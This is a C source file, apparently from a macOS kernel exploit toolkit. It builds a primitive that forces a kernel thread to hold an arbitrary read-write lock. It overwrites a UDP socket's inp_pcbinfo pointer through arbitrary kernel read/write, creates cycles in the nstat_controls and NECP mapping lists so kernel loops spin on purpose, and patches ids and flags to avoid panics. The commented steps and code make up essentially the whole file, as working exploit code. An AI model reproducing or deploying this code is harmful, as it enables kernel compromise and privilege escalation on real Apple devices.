//
//  util_lck_rw.c
//  xe
//
//  Created by admin on 12/2/21.
//

#include <stdlib.h>
#include <string.h>
#include <stdatomic.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include <dispatch/dispatch.h>

#include "util/lck_rw.h"
#include "memory/kmem.h"
#include "slider/kernel.h"
#include "xnu/proc.h"
#include "xnu/thread.h"
#include "util/dispatch.h"
#include "util/assert.h"
#include "util/misc.h"
#include "util/ptrauth.h"
#include "util/log.h"
#include "util/asm.h"

#include <macos/kernel.h>


///
/// This module provides functionality for acquiring / releasing arbitary read write locks in kernel
/// memory
///
///
/// When a UDP IPv6 socket is disconnected, the method `udp6_disconnect` defined in
/// `udp6_usrreq.c` is triggered.
///
/// static int
/// udp6_disconnect(struct socket *so)
/// {
///     struct inpcb *inp;
///     inp = sotoinpcb(so);  // so->so_pcb
///     ...
///     in6_pcbdisconnect(inp);
///     ...
/// }
///
/// The `udp6_disconnect` method triggers method `in6_pcbdisconnect` with argument
/// `so->so_pcb` (of type `struct inpcb`)
///
///
/// void
/// in6_pcbdisconnect(struct inpcb *inp)
/// {
///     struct socket *so = inp->inp_socket;
///
/// #if CONTENT_FILTER
///     if (so) {
///         so->so_state_change_cnt++;
///     }
/// #endif
///
///     if (!lck_rw_try_lock_exclusive(&inp->inp_pcbinfo.ipi_lock)) {
///         /* lock inversion issue, mostly with udp multicast packets */
///         socket_unlock(so, 0);
///         lck_rw_lock_exclusive(&inp->inp_pcbinfo.ipi_lock);
///         socket_lock(so, 0);
///     }
///     if (nstat_collect && SOCK_PROTO(so) == IPPROTO_UDP) {
///         nstat_pcb_cache(inp);
///     }
///     ...
///     in_pcbrehash(inp);
///     lck_rw_done(&inp->inp_pcbinfo.ipi_lock);
///     ...
/// }
/// ```
///
/// This method acquires `so->so_pcb->inp_pcbinfo.ipi_lock` and calls methods `nstat_pcb_cache`
/// and `in_pcbrehash` before releasing the lock. Inorder to make this method acquire an arbitary
/// lock `target_lck_rw`, we can set the value of `inp_pcbinfo` as
/// `so->so_pcb->inp_pcbinfo = target_lck_rw - offsetof(struct inpcbinfo, ipi_lock);`
///
/// Note that since `so->so_pcb->inp_pcbinfo.ipi_lock` is of type `lck_rw_t` and not of type `lck_rw_t*`,
/// we can't set the address of lock directly. In this case we are setting the value of pointer
/// `so->so_pcb->inp_pcbinfo` such that `&so->so_pcb->inp_pcbinfo.ipi_lock` is equal to
/// `target_lck_rw`. This means that all other members of `so->so_pcb->inp_pcbinfo`
/// (type `struct inpcbinfo*`) are likely invalid. So we need to be careful when other members
/// of `so->so_pcb->inp_pcbinfo` are used.
///
/// To control when the `target_lck_rw` is released, we can make use of `nstat_pcb_cache` method
/// which is called between lock acquire and release. The method `nstat_pcb_cache` is defined
/// as follows:
///
/// __private_extern__ void
/// nstat_pcb_cache(struct inpcb *inp)
/// {
///     ...
///     // NOTE: This loop can be made infinite by creating a cycle in `nstat_controls` tailq.
///     //       A cycle can be created by setting `last_element->ncs_next = first_element`
///     for (state = nstat_controls; state; state = state->ncs_next) {
///         lck_mtx_lock(&state->ncs_mtx);
///         ...
///     }
///     ...
/// }
///
/// As noted above we can create an infinite loop in `nstat_pcb_cache` by creating a cycle in
/// `nstat_controls` linked list. The infinite loop can be easily stopped by breaking the cycle in the
/// linked list. This allows us to have total control over when the `target_lck_rw` lock will be
/// released.
///
/// But there is a problem, the method `in_pcbrehash` uses members `ipi_hashmask` and
/// `ipi_hash_base` of `so->so_pcb->inp_pcbinfo` for computing the variable `head`.
///
/// void
/// in_pcbrehash(struct inpcb *inp)
/// {
///     struct inpcbhead *head;
///     u_int32_t hashkey_faddr;
///
///     if (inp->inp_vflag & INP_IPV6) {
///         hashkey_faddr = inp->in6p_faddr.s6_addr32[3] /* XXX */;
///     } else {
///         hashkey_faddr = inp->inp_faddr.s_addr;
///     }
///
///     // NOTE: the field `ipi_hashmask` is read from `inp_pcbinfo` and is used
///     //       for computing `inp->inp_hash_element`
///     inp->inp_hash_element = INP_PCBHASH(hashkey_faddr, inp->inp_lport,
///         inp->inp_fport, inp->inp_pcbinfo->ipi_hashmask);
///
///     // NOTE: the field `ipi_hash_base` is read from `inp_pcbinfo`. The value
///     //       of variable head is set as the pointer of the element of array
///     //       `inp_pcbinfo->ipi_hash_base` at index `inp->inp_hash_element`.
///     head = &inp->inp_pcbinfo->ipi_hashbase[inp->inp_hash_element];
///
///     if (inp->inp_flags2 & INP2_INHASHLIST) {
///         LIST_REMOVE(inp, inp_hash);
///         inp->inp_flags2 &= ~INP2_INHASHLIST;
///     }
///
///     VERIFY(!(inp->inp_flags2 & INP2_INHASHLIST));
///
///     // NOTE: `LIST_INSERT_HEAD` macro will call `LIST_CHECK_HEAD` macro. Since
///     //        variable `head` is not a valid list head, this would panic
///     LIST_INSERT_HEAD(head, inp, inp_hash);
///     inp->inp_flags2 |= INP2_INHASHLIST;
///
/// #if NECP
///     // This call catches updates to the remote addresses
///     inp_update_necp_policy(inp, NULL, NULL, 0);
/// #endif /* NECP */
/// }
///
/// Since both `ipi_hashmask` and `ipi_hash_base` are likely to be invalid, the variable `head`
/// is also likely not a valid list head. The variable `head` is checked using `LIST_CHECK_HEAD`
/// which will panic when it is not valid. To avoid the panic, we need to restore the value of pointer
/// `so->so_pcb->inp_pcbinfo` before stopping the infinite loop in `nstat_pcb_cache`.
///
/// We also have to change the pointer back to `target_lck_rw - offsetof(struct inpcbinfo, ipi_lock)`
/// before the lock is released by `in6_pcbdisconnect`. This can be done by creating another infinite
/// loop in `necp_uuid_lookup_uuid_with_service_id_locked`. At the end of `in_pcbrehash`, the
/// method `inp_update_necp_policy` method is called, which would indirectly call the method
/// `necp_uuid_lookup_uuid_with_service_id_locked`. The call stack is as follows
///
/// necp_uuid_lookup_uuid_with_service_id_locked
/// necp_socket_find_policy_match
/// inp_update_necp_policy
/// in_pcbrehash
///
/// The method `necp_uuid_lookup_uuid_with_service_id_locked` is defined as follows :
///
/// static struct necp_uuid_id_mapping *
/// necp_uuid_lookup_uuid_with_service_id_locked(u_int32_t local_id)
/// {
///     struct necp_uuid_id_mapping *searchentry = NULL;
///     struct necp_uuid_id_mapping *foundentry = NULL;
///
///     if (local_id == NECP_NULL_SERVICE_ID) {
///         return necp_uuid_get_null_service_id_mapping();
///     }
///
///     // NOTE: This loop can be made infinite by creating a cycle in `necp_uuid_service_id_list`.
///     //       We also have to make sure the if condition `searchentry->id == local_id` never
///     //       become `TRUE` so that the loop will not break
///     LIST_FOREACH(searchentry, &necp_uuid_service_id_list, chain) {
///         if (searchentry->id == local_id) {
///             foundentry = searchentry;
///             break;
///         }
///     }
///
///     return foundentry;
/// }
///
/// As noted above, a cycle in `necp_uuid_service_id_list` will make the `LIST_FOREACH` loop
/// in `necp_uuid_lookup_uuid_with_service_id_locked` infinite. This can be used for changing
/// the value of pointer `so->so_pcb->inp_pcbinfo` to `target_lck_rw - offsetof(struct inpcbinfo, ipi_lock)`
/// before the lock is released
///
/// See implementation below for more details.
///


#define MAX_NECP_UUID_MAPPING_ID 128
#define LR_LCK_RW_EXCLUSIVE_GEN_OFFSET 0xac


struct xpl_lck_rw {
    int sock_fd;
    uintptr_t target_lck_rw;
    uintptr_t socket;
    uintptr_t so_pcb;
    uintptr_t inp_pcbinfo;
    uintptr_t nstat_controls_head;
    uintptr_t nstat_controls_tail;
    uintptr_t necp_uuid_id_mapping_head;
    uintptr_t necp_uuid_id_mapping_tail;
    uintptr_t locking_thread;
    
    dispatch_semaphore_t sem_disconnect_done;
};

/// sets value of `socket->so_pcb->inp_pcbinfo` such that address of
/// `socket->so_pcb->inp_pcbinfo.ipi_lock` = `target_lck_rw`
void xpl_lck_rw_set_lock(xpl_lck_rw_t util) {
    xpl_assert(util->inp_pcbinfo != 0);
    xpl_assert(util->so_pcb != 0);
    uintptr_t new_inp_pcbinfo = util->target_lck_rw - TYPE_INPCBINFO_MEM_IPI_LOCK_OFFSET;
    xpl_assert(xpl_kmem_read_uint64(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET) == util->inp_pcbinfo);
    xpl_kmem_write_uint64(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET, new_inp_pcbinfo);
}

/// restores `socket->so_pcb->inp_pcbinfo`
void xpl_lck_rw_restore_lock(xpl_lck_rw_t util) {
    xpl_assert(util->inp_pcbinfo != 0);
    xpl_assert(util->so_pcb != 0);
    xpl_kmem_write_uint64(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET, util->inp_pcbinfo);
}

/// make the loop `for (state = nstat_controls; state; state = state->ncs_next) { ... }`
/// in `nstat_pcb_cache` method infinite
void xpl_util_lck_create_nstat_controls_cycle(xpl_lck_rw_t util) {
    xpl_assert(util->nstat_controls_head != 0);
    xpl_assert(util->nstat_controls_tail != 0);
    xpl_assert(xpl_kmem_read_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET) == 0);
    xpl_kmem_write_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET, util->nstat_controls_head);
}

/// break infinite loop in nstat_pcb_cache
void xpl_util_lck_break_nstat_controls_cycle(xpl_lck_rw_t util) {
    xpl_assert(util->nstat_controls_head != 0);
    xpl_assert(util->nstat_controls_tail != 0);
    xpl_assert(xpl_kmem_read_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET) == util->nstat_controls_head);
    xpl_kmem_write_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET, 0);
}

/// save head and tail of nstat_controls tailq
void xpl_util_lck_read_nstat_controls_state(xpl_lck_rw_t util) {
    xpl_assert(util->nstat_controls_head == 0);
    xpl_assert(util->nstat_controls_tail == 0);
    uintptr_t head = xpl_kmem_read_uint64(xpl_slider_kernel_slide(VAR_NSTAT_CONTROLS_ADDR), 0);
    uintptr_t tail = head;
    while (TRUE) {
        uintptr_t next = xpl_kmem_read_uint64(tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET);
        if (next == 0) {
            break;
        } else {
            tail = next;
        }
    }
    xpl_assert(head != tail);
    util->nstat_controls_head = head;
    util->nstat_controls_tail = tail;
}

/// make the `LIST_FOREACH()...` loop in `necp_uuid_lookup_uuid_with_service_id_locked`
/// method infinite
void xpl_util_lck_create_necp_mapping_cycle(xpl_lck_rw_t util) {
    xpl_assert(util->necp_uuid_id_mapping_head != 0);
    xpl_assert(util->necp_uuid_id_mapping_tail != 0);
    xpl_assert(xpl_kmem_read_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET) == 0);
    xpl_kmem_write_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET, util->necp_uuid_id_mapping_head);
}

/// break infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked`
void xpl_util_lck_break_necp_mapping_cycle(xpl_lck_rw_t util) {
    xpl_assert(util->necp_uuid_id_mapping_head != 0);
    xpl_assert(util->necp_uuid_id_mapping_tail != 0);
    xpl_assert(xpl_kmem_read_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET) == util->necp_uuid_id_mapping_head);
    xpl_kmem_write_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET, 0);
}

/// ensures `LIST_FOREACH` in `necp_uuid_lookup_uuid_with_service_id_locked never` breaks
void xpl_util_lck_invalidate_necp_ids(xpl_lck_rw_t util) {
    xpl_assert(util->necp_uuid_id_mapping_head != 0);
    xpl_assert(util->necp_uuid_id_mapping_tail != 0);
    uintptr_t cursor = util->necp_uuid_id_mapping_head;
    do {
        uint32_t id = xpl_kmem_read_uint32(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET);
        xpl_assert_cond(id, <=, MAX_NECP_UUID_MAPPING_ID);
        xpl_kmem_write_uint64(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET, UINT16_MAX - id);
        cursor = xpl_kmem_read_uint64(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET);
        xpl_assert(cursor != 0);
    } while (cursor != util->necp_uuid_id_mapping_tail);
}

/// restores id of `necp_uuid_id_mapping`
void xpl_util_lck_restore_necp_ids(xpl_lck_rw_t util) {
    xpl_assert(util->necp_uuid_id_mapping_head != 0);
    xpl_assert(util->necp_uuid_id_mapping_tail != 0);
    uintptr_t cursor = util->necp_uuid_id_mapping_head;
    do {
        uint32_t id = xpl_kmem_read_uint32(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET);
        xpl_assert_cond(id, >=, UINT16_MAX - MAX_NECP_UUID_MAPPING_ID);
        xpl_kmem_write_uint64(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET, UINT16_MAX - id);
        cursor = xpl_kmem_read_uint64(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET);
        xpl_assert(cursor != 0);
    } while (cursor != util->necp_uuid_id_mapping_tail);
}

/// save head and tail of `necp_uuid_id_mapping` list
void xpl_util_lck_read_necp_uuid_id_mapping_state(xpl_lck_rw_t util) {
    xpl_assert(util->necp_uuid_id_mapping_head == 0);
    xpl_assert(util->necp_uuid_id_mapping_tail == 0);
    uintptr_t head = xpl_kmem_read_uint64(xpl_slider_kernel_slide(VAR_NECP_UUID_SERVICE_ID_LIST_ADDR), 0);
    uintptr_t tail = head;
    while (TRUE) {
        uintptr_t next = xpl_kmem_read_uint64(tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET);
        if (next == 0) {
            break;
        } else {
            tail = next;
        }
    }
    xpl_assert(tail != head);
    util->necp_uuid_id_mapping_head = head;
    util->necp_uuid_id_mapping_tail = tail;
}


xpl_lck_rw_t xpl_lck_rw_lock_exclusive(uintptr_t lock) {
    uintptr_t proc = xpl_proc_current_proc();
    
    /// STEP 1: Create a new IPv6 UDP socket
    struct sockaddr_in6 src_addr;
    bzero(&src_addr, sizeof(src_addr));
    src_addr.sin6_addr = in6addr_loopback;
    src_addr.sin6_port = 18231;
    src_addr.sin6_family = AF_INET6;
    src_addr.sin6_len = sizeof(src_addr);
    
    int sock_fd = socket(PF_INET6, SOCK_DGRAM, 0);
    xpl_assert(sock_fd >= 0);
    
    sa_endpoints_t epts;
    bzero(&epts, sizeof(epts));
    epts.sae_dstaddr = (struct sockaddr*)&src_addr;
    epts.sae_dstaddrlen = sizeof(src_addr);

    /// STEP 2: Connect the socket to any IP address
    int res = connectx(sock_fd, &epts, SAE_ASSOCID_ANY, 0, NULL, 0, NULL, NULL);
    xpl_assert(res == 0);
    
    uintptr_t socket;
    int error = xpl_proc_find_fd_data(proc, sock_fd, &socket);
    xpl_assert_err(error);
    
    uintptr_t inpcb = xpl_kmem_read_uint64(socket, TYPE_SOCKET_MEM_SO_PCB_OFFSET);
    uintptr_t inp_pcbinfo = xpl_kmem_read_uint64(inpcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET);
    
    xpl_lck_rw_t util = (xpl_lck_rw_t)malloc(sizeof(struct xpl_lck_rw));
    bzero(util, sizeof(*util));
    util->sock_fd = sock_fd;
    util->socket = socket;
    util->so_pcb = inpcb;
    util->inp_pcbinfo = inp_pcbinfo;
    util->target_lck_rw = lock;
    util->sem_disconnect_done = dispatch_semaphore_create(0);
    
    xpl_util_lck_read_nstat_controls_state(util);
    xpl_util_lck_read_necp_uuid_id_mapping_state(util);
    
    /// STEP 3: Modify the value of `socket->so_pcb->inp_pcbinfo` such that
    /// `socket->so_pcb->inp_pcbinfo.ipi_lock = util->target_lck_rw`
    /// This lock is acquired by method `in6_pcbdisconnect` defined in in6_pcb.c when
    /// `util->socket` is disconnected
    xpl_lck_rw_set_lock(util);
    
    /// STEP 4: Create a cycle in `nstat_controls` linked list. This will creates a infinite loop in
    /// `nstat_pcb_cache` function. This method is triggered by method `in6_pcbdisconnect`
    /// defined in in6_pcb.c when `util->socket` is disconnected
    xpl_util_lck_create_nstat_controls_cycle(util);
    
    dispatch_semaphore_t sem_disconnect_start = dispatch_semaphore_create(0);
    /// STEP 5: Asynchronously disconnect `util->socket`. This will acquire the lock `util->target_lck_rw`
    dispatch_async(xpl_dispatch_queue(), ^() {
        util->locking_thread = xpl_thread_current_thread();
        dispatch_semaphore_signal(sem_disconnect_start);
        /// Triggers `in6_pcbdisconnect` method which acquires `util->target_lck_rw`. Since
        /// the method `xpl_util_lck_create_nstat_controls_cycle` has created a cycle in
        /// `nstat_pcb_cache`, the lock is kept held until the cycle is broken.
        int error = disconnectx(util->sock_fd, SAE_ASSOCID_ANY, SAE_CONNID_ANY);
        xpl_assert_err(error);
        dispatch_semaphore_signal(util->sem_disconnect_done);
    });
    
    dispatch_semaphore_wait(sem_disconnect_start, DISPATCH_TIME_FOREVER);
    dispatch_release(sem_disconnect_start);
    
    xpl_log_debug("waiting for lock owner to be set to locking thread");
    /// Wait until the owner of lock changes to `util->locking_thread`
    while (xpl_kmem_read_ptr(lock, 8) != util->locking_thread) {
        xpl_sleep_ms(10);
    }
    xpl_log_debug("lock owner is now set to locking thread");
    
    return util;
}


void xpl_lck_rw_lock_done(xpl_lck_rw_t* util_p) {
    xpl_lck_rw_t util = *util_p;
    
    /// STEP 6: Restore the value of `socket->so_pcb->inp_pcbinfo` so that operations in
    /// `in_pcbrehash` requiring values from `inp_pcbinfo` will not cause panic
    xpl_lck_rw_restore_lock(util);
    
    /// STEP 7: Assigns different laddr (other than loopback) to `socket->so_pcb->inp_dependladdr`.
    /// This prevents `necp_socket_bypass` method from returning `NECP_BYPASS_TYPE_LOOPBACK`
    /// allowing `necp_socket_find_policy_match` to reach the below for loop
    /// `for (netagent_cursor = 0; netagent_cursor < NECP_MAX_NETAGENTS; netagent_cursor++) {
    ///     ...
    ///     mapping = necp_uuid_lookup_uuid_with_service_id_locked(netagent_id)
    ///     ...
    ///  }
    struct in6_addr new_laddr;
    memset(&new_laddr, 0xab, sizeof(new_laddr));
    xpl_kmem_write(util->so_pcb, TYPE_INPCB_MEM_INP_DEPENDLADDR_OFFSET, &new_laddr, sizeof(new_laddr));
    
    /// STEP 8:  Clear INP2_INHASHLIST flag from `so_pcb->inp_flags2`. This flag will be
    /// added to `so_pcb->inp_flags2` by `in_pcbrehash` method after the values `ipi_hashbase`
    /// and `ipi_hashmask` are used. We will monitor this flag below to detect when
    /// `in_pcbrehash` method is done using these values
    ///
    /// void
    /// in_pcbrehash(struct inpcb *inp)
    /// {
    ///     struct inpcbhead *head;
    ///     ....
    ///
    ///    inp->inp_hash_element = INP_PCBHASH(hashkey_faddr, inp->inp_lport,
    ///        inp->inp_fport, inp->inp_pcbinfo->ipi_hashmask);
    ///    head = &inp->inp_pcbinfo->ipi_hashbase[inp->inp_hash_element];
    ///
    ///    if (inp->inp_flags2 & INP2_INHASHLIST) {
    ///        LIST_REMOVE(inp, inp_hash);
    ///        inp->inp_flags2 &= ~INP2_INHASHLIST;
    ///    }
    ///
    ///    VERIFY(!(inp->inp_flags2 & INP2_INHASHLIST));
    ///    LIST_INSERT_HEAD(head, inp, inp_hash);
    ///
    ///    // NOTE: We need to detect when `in_pcbrehash` method reaches here
    ///    inp->inp_flags2 |= INP2_INHASHLIST;
    ///
    /// #if NECP
    ///    // This call catches updates to the remote addresses
    ///    inp_update_necp_policy(inp, NULL, NULL, 0);
    /// #endif /* NECP */
    /// }
    uint32_t flags2 = xpl_kmem_read_uint32(util->so_pcb, TYPE_INPCB_MEM_INP_FLAGS2_OFFSET);
    if (flags2 & 0x00000010) { // INP2_INHASHLIST
        uintptr_t next = xpl_kmem_read_ptr(util->so_pcb, TYPE_INPCB_MEM_INP_HASH_OFFSET);
        uintptr_t prev = xpl_kmem_read_ptr(util->so_pcb, TYPE_INPCB_MEM_INP_HASH_OFFSET + 8);
        xpl_assert(prev != 0);
        if (next) {
            xpl_kmem_write_uint64(next, TYPE_INPCB_MEM_INP_HASH_OFFSET + 8, prev);
        }
        xpl_kmem_write_uint64(prev, 0, next);
        xpl_kmem_write_uint32(util->so_pcb, TYPE_INPCB_MEM_INP_FLAGS2_OFFSET, flags2 & ~0x00000010);
        xpl_log_debug("removed inpcb from hash list");
    }
    
    /// STEP 9: Create a cycle in list `necp_uuid_service_id_list`
    /// Prevent the `LIST_FOREACH` in `necp_uuid_lookup_uuid_with_service_id_locked` method from breaking
    xpl_util_lck_invalidate_necp_ids(util);
    /// Create a infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked` method. This method is
    /// indirectly triggered during socket disconnect by method `in6_pcbdisconnect`. The call stack is
    ///     necp_uuid_lookup_uuid_with_service_id_locked
    ///     necp_socket_find_policy_match
    ///     inp_update_necp_policy
    ///     in_pcbrehash
    ///     in6_pcbdisconnect
    xpl_util_lck_create_necp_mapping_cycle(util);
    
    /// STEP 10: Break the cycle in `nstat_controls` linked list
    /// This will break the infinite loop in `nstat_pcb_cache` method
    xpl_util_lck_break_nstat_controls_cycle(util);
    
    xpl_log_debug("waiting for INP2_INHASHLIST flag to be set");
    /// STEP 11: Wait till `in_pcbrehash` method is done using the values `ipi_hashbase`
    /// and `ipi_hashmask`
    while (!(xpl_kmem_read_uint32(util->so_pcb, TYPE_INPCB_MEM_INP_FLAGS2_OFFSET) & 0x00000010)) {
        xpl_sleep_ms(10);
    }
    xpl_log_debug("INP2_INHASHLIST flag is now set");
    
    /// STEP 12: Set the address of `socket->so_pcb->inp_pcbinfo.ipi_lock` back to `util->target_lck_rw`
    /// so that correct lock will be released when the program reaches `lck_rw_done` in `in6_pcbdisconnect`
    xpl_lck_rw_set_lock(util);
    
    /// STEP 13: Restore id and break the infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked `
    xpl_util_lck_restore_necp_ids(util);
    xpl_util_lck_break_necp_mapping_cycle(util);
    
    /// STEP 14: Wait until socket `disconnectx` returns. Once this happens, the
    /// lock `util->target_lck_rw` will be released
    dispatch_semaphore_wait(util->sem_disconnect_done, DISPATCH_TIME_FOREVER);
    
    /// Restores value of `socket->so_pcb->inp_pcbinfo`
    xpl_lck_rw_restore_lock(util);
    
    dispatch_release(util->sem_disconnect_done);
    free(util);
    *util_p = NULL;
}


uintptr_t xpl_lck_rw_locking_thread(xpl_lck_rw_t util) {
    return util->locking_thread;
}


/// Wait until the thread `thread` tries to acquire exclusive lock of read write lock `util->target_lck_rw`
/// using `lck_rw_lock_exclusive` or `IORWLockWrite` method
int xpl_lck_rw_wait_for_contention(xpl_lck_rw_t util, uintptr_t thread, uintptr_t* lr_stack_ptr) {
    /// try for ~ 10 seconds
    int max_tries = 1000;
    
    do {
        _Bool w_waiting = xpl_kmem_read_bitfield_uint64(util->target_lck_rw, TYPE_LCK_RW_BF0_OFFSET, TYPE_LCK_RW_BF0_MEM_W_WAITING_BIT_OFFSET, TYPE_LCK_RW_BF0_MEM_W_WAITING_BIT_SIZE);
        if (!w_waiting) {
            xpl_log_verbose("no contention by %p (w_waiting)", (void*)thread);
            continue;
        }
        
        /// Link register value for branch with link call from `lck_rw_lock_exclusive` to `lck_rw_exclusive_gen`
        uintptr_t lr_exclusive_gen = xpl_slider_kernel_slide(FUNC_LCK_RW_LOCK_EXCLUSIVE_ADDR) + LR_LCK_RW_EXCLUSIVE_GEN_OFFSET;
        xpl_assert_cond(xpl_kmem_read_uint32(lr_exclusive_gen - 4, 0), ==, xpl_asm_build_bl_instr(xpl_slider_kernel_slide(FUNC_LCK_RW_LOCK_EXCLUSIVE_GEN_ADDR), lr_exclusive_gen - 4));
        
        uintptr_t found_address;
        int error = xpl_thread_scan_stack(thread, lr_exclusive_gen, XPL_PTRAUTH_MASK, 512, &found_address);
        if (error == EBADF || error == ENOENT) {
            xpl_log_verbose("no contention by %p (stack_scan err: %d)", (void*)thread, error);
            continue;
        }
        xpl_assert_err(error);
        
        uintptr_t lock = xpl_kmem_read_ptr(found_address - 0x10 /* x19 */, 0);
        if (lock == util->target_lck_rw) {
            if (lr_stack_ptr) {
                *lr_stack_ptr = found_address;
            }
            return 0;
        }
        
        xpl_log_verbose("no contention by %p (lock (%p) does not match)", (void*)thread, (void*)lock);
        xpl_sleep_ms(10);
    } while (--max_tries > 0);
    
    return ETIMEDOUT;
}
